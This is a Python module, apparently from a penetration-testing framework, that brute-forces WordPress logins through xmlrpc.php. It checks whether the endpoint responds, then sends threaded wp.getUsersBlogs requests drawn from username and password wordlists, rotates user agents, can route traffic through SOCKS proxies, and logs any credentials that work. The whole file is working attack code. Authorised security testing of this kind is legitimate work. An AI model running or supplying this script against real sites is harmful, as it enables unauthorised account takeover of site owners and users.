#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author Pradeep Jairamani; github.com/pradeepjairamani

import socket
import socks
import time
import json
import threading
import string
import requests
import random
import os
import re
from core.alert import *
from core.targets import target_type
from core.targets import target_to_host
from core.load_modules import load_file_path
from lib.socks_resolver.engine import getaddrinfo
from core._time import now
from core.log import __log_into_file
from core._die import __die_failure
from lib.scan.wp_theme import themes
from lib.scan.wp_theme import small_themes
from lib.payload.wordlists import useragents
from lib.payload.wordlists import usernames, passwords

def extra_requirements_dict():
    return {
        "wp_users": usernames.users(),
        "wp_passwds": passwords.passwords(),
        "wp_xmlrpc_brute_ports": [80, 443]
    }


def check(user, passwd, target, port, headers, timeout_sec, log_in_file, language,
            retries, time_sleep, thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
    time.sleep(time_sleep)
    try:
        if socks_proxy is not None:
            socks_version = socks.SOCKS5 if socks_proxy.startswith(
                'socks5://') else socks.SOCKS4
            socks_proxy = socks_proxy.rsplit('://')[1]
            if '@' in socks_proxy:
                socks_username = socks_proxy.rsplit(':')[0]
                socks_password = socks_proxy.rsplit(':')[1].rsplit('@')[0]
                socks.set_default_proxy(socks_version, str(socks_proxy.rsplit('@')[1].rsplit(':')[0]),
                                        int(socks_proxy.rsplit(':')[-1]), username=socks_username,
                                        password=socks_password)
                socket.socket = socks.socksocket
                socket.getaddrinfo = getaddrinfo
            else:
                socks.set_default_proxy(socks_version, str(
                    socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
                socket.socket = socks.socksocket
                socket.getaddrinfo = getaddrinfo
        n = 0
        while 1:
            try:
                if target_type(target) != "HTTP" and port == 443:
                    target = 'https://' + target
                if target_type(target) != "HTTP" and port == 80:
                    target = 'http://' + target
                target = target + '/xmlrpc.php'
                postdata = '''<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>'''+ user +'''</string></value></param><param><value><string>'''+ passwd + '''</string></value></param></params></methodCall>'''
                r = requests.post(
                        target, timeout = timeout_sec, headers = headers, data = postdata)
                if "incorrect" not in r.text.lower() and user in r.text.lower():
                    info(messages(language, "user_pass_found").format(
                                    user, passwd, target, port))
                    data = json.dumps({'HOST': target, 'USERNAME': user, 'PASSWORD': passwd, 'PORT': port, 'TYPE': 'wp_xmlrpc_brute',
                               'DESCRIPTION': messages(language, "login_successful"), 'TIME': now(), 'CATEGORY': "brute"}) + "\n"
                    __log_into_file(log_in_file, 'a', data, language)
                break
            except:
                n += 1
                if n == retries:
                    warn(messages(language, "http_connection_timeout").format(target))
                    return 1
            return True
    except:
        return False


def test(target, port, retries, timeout_sec, headers, socks_proxy, verbose_level, trying, total_req, total, num, language):
    if socks_proxy is not None:
        socks_version = socks.SOCKS5 if socks_proxy.startswith(
            'socks5://') else socks.SOCKS4
        socks_proxy = socks_proxy.rsplit('://')[1]
        if '@' in socks_proxy:
            socks_username = socks_proxy.rsplit(':')[0]
            socks_password = socks_proxy.rsplit(':')[1].rsplit('@')[0]
            socks.set_default_proxy(socks_version, str(socks_proxy.rsplit('@')[1].rsplit(':')[0]),
                                    int(socks_proxy.rsplit(':')[-1]), username=socks_username,
                                    password=socks_password)
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
        else:
            socks.set_default_proxy(socks_version, str(
                socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
    n = 0
    while 1:
        try:
            headers = {}
            if target_type(target) != "HTTP" and port == 443:
                target = 'https://' + target
            if target_type(target) != "HTTP" and port == 80:
                target = 'http://' + target
            postdata = '''<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string></string></value></param></params></methodCall>'''
            try:
                req = requests.post(target+'/xmlrpc.php', data = postdata, headers = headers)
                #print (target)
                if re.search('<int>403</int>',req.text):
                    return True
                else:
                    return False
            except:
                return False
        except Exception as err:
            return False
            


def start(target, users, passwds, ports, timeout_sec, thread_number, num, total, log_in_file, time_sleep, language,
          verbose_level, socks_proxy, retries, methods_args, scan_id, scan_cmd):  # Main function
    if target_type(target) != 'SINGLE_IPv4' or target_type(target) != 'DOMAIN' or target_type(
            target) != 'HTTP' or target_type(target) != 'SINGLE_IPv6':
        # rand useragent
        user_agent_list = useragents.useragents()
        headers = {'User-agent': random.choice(user_agent_list), 'Content-Type': 'text/xml'}

        # requirements check
        new_extra_requirements = extra_requirements_dict()
        if methods_args is not None:
            for extra_requirement in extra_requirements_dict():
                if extra_requirement in methods_args:
                    new_extra_requirements[
                        extra_requirement] = methods_args[extra_requirement]
        extra_requirements = new_extra_requirements
        threads = []
        if users is None:
            users = extra_requirements["wp_users"]
        if passwds is None:
            passwds = extra_requirements["wp_passwds"]
        if ports is None:
            ports = extra_requirements["wp_xmlrpc_brute_ports"]
        if verbose_level > 3:
            total_req = len(users) * len(passwds) * len (ports)
        else:
            total_req = len(users) * len(passwds) * len(ports)
        thread_tmp_filename = '{}/tmp/thread_tmp_'.format(load_file_path()) + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(20))
        __log_into_file(thread_tmp_filename, 'w', '1', language)
        trying = 0
        if target_type(target) != "HTTP":
            target = 'https://' + target
        for port in ports:
            if test(str(target), port, retries, timeout_sec, headers,
                    socks_proxy, verbose_level, trying, total_req, total, num, language) is True:
                keyboard_interrupt_flag = False
                for user in users:
                    for passwd in passwds:
                        #print(user + " " + passwd)
                        t = threading.Thread(target=check,
                                             args=(
                                                 user, passwd, target, port, headers, timeout_sec, log_in_file, language,
                                                 retries, time_sleep, thread_tmp_filename, socks_proxy,
                                                 scan_id, scan_cmd))
                        threads.append(t)
                        t.start()
                        trying += 1
                        if verbose_level > 3:
                            info(messages(language, "trying_message").format(trying, total_req, num, total, target_to_host(target),
                                                                             port, 'wp_xmlrpc_brute'))
                        while 1:
                            try:
                                if threading.activeCount() >= thread_number:
                                    time.sleep(0.01)
                                else:
                                    break
                            except KeyboardInterrupt:
                                keyboard_interrupt_flag = True
                                break
                        if keyboard_interrupt_flag:
                            break

            else:
                warn(messages(language, "open_error").format(target))

        # wait for threads
        kill_switch = 0
        kill_time = int(
            timeout_sec / 0.1) if int(timeout_sec / 0.1) != 0 else 1
        while 1:
            time.sleep(0.1)
            kill_switch += 1
            try:
                if threading.activeCount() == 1 or kill_switch == kill_time:
                    break
            except KeyboardInterrupt:
                break
        thread_write = int(open(thread_tmp_filename).read().rsplit()[0])
        os.remove(thread_tmp_filename)
    else:
        warn(messages(language, "input_target_error").format(
            'wp_xmlrpc_brute', target))
